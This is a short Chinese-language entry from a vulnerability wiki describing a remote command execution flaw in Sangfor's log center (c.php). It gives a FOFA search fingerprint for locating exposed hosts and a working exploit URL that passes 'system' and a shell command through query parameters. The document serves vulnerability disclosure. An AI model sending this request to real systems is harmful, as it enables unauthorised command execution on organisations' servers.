---
title: 深信服 日志中心 c.php 远程命令执行漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - Web应用漏洞
 - 深信服
---

#  深信服 日志中心 c.php 远程命令执行漏洞

## 漏洞描述

深信服 日志中心 c.php  远程命令执行漏洞，使用与EDR相同模板和部分文件导致命令执行

## 漏洞影响

> [!NOTE]
>
> 深信服 日志中心

## FOFA

> [!NOTE]
>
> body="isHighPerformance : !!SFIsHighPerformance,"

## 漏洞复现

登录页面如下

![image-20210531192407444](/img/20210924020227549712.png)

访问漏洞Url

```
/tool/log/c.php?strip_slashes=system&host=ipconfig
```

![image-20210531192540462](/img/20210924020227868625.png)